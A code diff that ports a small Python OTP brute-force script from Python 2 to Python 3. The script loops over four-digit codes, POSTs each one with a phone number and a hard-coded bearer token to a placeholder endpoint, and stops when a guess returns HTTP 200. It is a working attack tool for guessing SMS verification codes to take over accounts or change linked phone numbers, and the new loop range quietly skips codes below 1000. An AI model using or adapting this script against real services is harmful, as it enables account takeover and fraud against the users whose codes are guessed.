@@ -1,38 +1,35 @@
-#!/usr/bin/python2
+#!/usr/bin/python3
 
 import requests
 import os
 import json
+import sys
 
 # clean screen
 os.system("cls")
 os.system("clear")
 
 logo = '''
-
                  ########################################
-
-
-                 ------- Devloper by Yousef -----------
+                    ------- Devloper by Yousef -----------
                            Twitter : y0usef_11
-
                  ########################################
-
 '''
 
-print logo
+print (logo)
 
-for i in xrange(0, 10000):
+for i in range(1000, 9999):
     # loops Guess the numbers
     number = "{:04d}".format(i)
 
-    url = "http://exmples/oms/api8/CheckUserOtp?"
-    data = {'otp': number ,'mobile':""} # yThe data you want to guess
-    header = {"Content-Type" : "charset=UTF-8" , "Authorizations" : "060fac9a80afec9b95eb292ad884c5f5"}
+    url = "https://example"
+    data = {'code': number ,'PhoneNumber':"00000000000"} # enter number for change
+    header = {"Content-Type" : "application/json" , "Authorization" : "Bearer TEZTApFI9Ziucpdj1ndK_0bGLRHAFNdcSPWCP1X61Wz2iitVDERG8ZE"}
 
     re = requests.post(url , data=json.dumps(data) , headers=header)
 
     if re.status_code == 200:
-        print re.content
+        print ("[+] otp is catch" , "otp number" , i ,"Satus code is" ,re.status_code)
+        sys.exit(0)
     else :
-        print "otp Not same :( "
+        print ("[-] otp Not same " , "otp number" ,i ,"Satus code is" ,re.status_code)
